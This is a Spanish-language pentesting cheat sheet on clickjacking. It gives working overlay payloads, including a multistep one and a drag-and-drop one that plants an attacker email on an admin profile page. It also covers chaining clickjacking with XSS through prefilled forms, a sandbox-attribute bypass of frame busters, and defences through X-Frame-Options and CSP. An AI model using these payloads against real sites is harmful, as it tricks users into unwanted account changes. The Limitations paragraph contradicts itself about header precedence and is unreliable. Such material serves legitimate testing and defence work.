# Clickjacking

## Summary

* [Populate Forms Trick](#populate-forms-trick)
* [Populate Form with Drag & Drop](#populate-form-with-drag-&-drop)
* [Testing PoC](#testing-poc)
* [Basic Payload](#basic-payload)
* [Multistep Payload](#multistep-payload)
* [Drag & Drop + Click Payload](#drag-&-drop-+-click-payload)
* [XSS + Clickjacking](#xss-+-clickjacking)
* [Como Prevenir el Clickjacking](#como-prevenir-el-clickjacking)
	* [Bypass](#bypass)
	* [X-Frame-Options](#xframeoptions)
	* [Frame Ancestors](#frame-ancestors)
	* [Limitations](#limitations)

Clickjacking es un ataque que engaña a un usuario para que haga clic en un elemento de la página web que es invisible o está disfrazado como otro elemento. 

Esto puede hacer que los usuarios descarguen malware, visiten páginas web maliciosas, proporcionen credenciales o información confidencial, transfieran dinero o compren productos en línea sin saberlo.

## Populate Forms Trick

A veces es posible **completar el valor de los campos de un formulario usando parámetros GET al cargar una página**. 

Un atacante puede abusar de estos comportamientos para llenar un formulario con datos arbitrarios y enviar la carga útil de clickjacking para que el usuario presione el botón *Enviar*.

## Populate Form with Drag & Drop

Si necesita que el usuario **complete un formulario** pero no quiere pedirle directamente que escriba alguna información específica (como su correo electrónico o una contraseña específica que usted conozca), puede simplemente pedirle que **Arrastre y suelte** algo que escribirá tus datos controlados como en [este ejemplo](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).


## Testing PoC

Los pentesters pueden investigar si una página de destino se puede cargar en un iframe creando una página web simple que incluya un iframe que contenga la página web de destino. En el siguiente fragmento se muestra un ejemplo de código HTML para crear esta página web de prueba:

```html
<html>
    <head>
        <title>Clickjack test page</title>
    </head>
    <body>
        <iframe src="http://www.target.site" width="500" height="500"></iframe>
    </body>
</html>
```

Si la página http://www.target.site se carga correctamente en el marco, entonces el sitio es vulnerable y no tiene ningún tipo de protección contra los ataques de clickjacking


## Basic Payload

```markup
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.1;
       z-index: 2;
   }
   div {
       position:absolute;
       top:470px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```

## Multistep Payload

```markup
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 500px;
       opacity: 0.1;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:330px;
       left:60px;
       z-index: 1;
   }
   .secondClick {
       left:210px;
   }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```

## Drag & Drop + Click Payload

```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```

## XSS + Clickjacking

Si ha identificado un **ataque XSS que requiere que un usuario haga clic** en algún elemento para **activar** el XSS y la página es **vulnerable a clickjacking**, puede abusar de él para engañar al usuario para que haga clic el botón/enlace.

Ejemplo:

Encontró un **XSS** en algunos detalles privados de la cuenta (detalles que **solo usted puede configurar y leer**). 

La página con el **formulario** para establecer estos detalles es **vulnerable** a **Clickjacking** y puede **rellenar previamente** el **formulario** con parámetros GET.

Un atacante podría preparar un ataque de **Clickjacking** a esa página **rellenando previamente** el **formulario** con el **payload XSS** y **engañar** al usuario para  **Enviar** dicho formulario. 

Entonces, cuando se envía el formulario y se modifican los valores, el **usuario ejecutará el XSS**.

## Como Prevenir el Clickjacking

Es posible ejecutar scripts en el lado del cliente que realizan algunos o todos los siguientes comportamientos para evitar Clickjacking:

- Verificar y hacer cumplir que la ventana de la aplicación actual sea la ventana principal o superior.
- Hacer que todos los marcos sean visibles.
- Evitar hacer clic en marcos invisibles.
- Interceptar y señalar posibles ataques de secuestro de clics al usuario.

### Bypass

Dado que los **frame busters** (desctructores de iframe) es JavaScript, la configuración de seguridad del navegador puede impedir su funcionamiento o, de hecho, es posible que el navegador ni siquiera sea compatible con JavaScript. 

Una solución eficaz de un atacante contra los **frame busters** es utilizar el atributo `sandbox` de iframe de HTML5. 

Cuando se establece con los valores de `allow-forms` o` allow-scripts` y se omite el valor de `allow-top-navigation`, entonces el script protector de **frame buster** se puede neutralizar ya que el iframe no puede verificar si es o no el superior ventana:

```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```

Los valores de `allow-forms` y` allow-scripts` permiten las acciones especificadas dentro del iframe, pero la navegación de nivel superior está deshabilitada. Esto inhibe los comportamientos de **frame busters** al mismo tiempo que permite la funcionalidad dentro del sitio de destino.

Dependiendo del tipo de ataque de Clickjaking realizado **es posible que también deba permitir**: `allow-same-origin` y `allow-modals` o [incluso algunos más](https://www.w3schools.com/tags/att_iframe_sandbox.asp). 

Al preparar el ataque, simplemente revise la consola del navegador, puede decirle qué otros comportamientos debe permitir.

### X-Frame-Options

El  header de la response HTTP `X-Frame-Options` puede usarse para indicar si un navegador debe tener **permitido** o no representar una página en un `<frame>` o `<iframe>`. 

Los sitios pueden usar esto para evitar ataques de Clickjacking, asegurándose de que **su contenido no esté incrustado en otros sitios**. 

Establezca el encabezado  `X-Frame-Options` para todas las respuestas que contengan contenido HTML.

Los posibles valores son:

* `X-Frame-Options: deny` que evita que cualquier dominio embeba el contenido.
* `X-Frame-Options: sameorigin` que solo permite que el sitio actual embeba el contenido.
* `X-Frame-Options: allow-from https: // trust.com` que permite que sólo el `URI` especificado embeba esta página.


### Frame Ancestors

La protección recomendada contra el secuestro de clics es incorporar la **directiva `frame-ancestors`** en la CSP de la aplicación.

La directiva `frame-ancestors 'none'` es similar en comportamiento a la directiva **`X-Frame-Options: deny`** (nadie puede embeber la página).

La directiva **`frame-ancestors: 'self'`** es equivalente a la directiva **`X-Frame-Options sameorigin`**  (solo el sitio actual puede embeber la página).

La directiva **`frame-ancestors trust.com`** es equivalente a la directiva **`X-Frame-Options: allow-from`** (solo un sitio confiable puede embeber la página).

Los siguientes CSP whitelists frames se utilizan para permitir embember la página desde el mismo dominio:

`Content-Security-Policy: frame-ancestors 'self';`

### Limitations

`X-Frame-Options` tiene prioridad, ya que si un recurso se entrega con una política que incluye una directiva llamada `frame-ancestors`, entonces el encabezado `X-Frame-Options` DEBE ignorarse, sin embargo *Chrome 40* y *Firefox 35* ignoran la directiva `frame-ancestors` y dan prioridad al header `X-Frame-Options`.
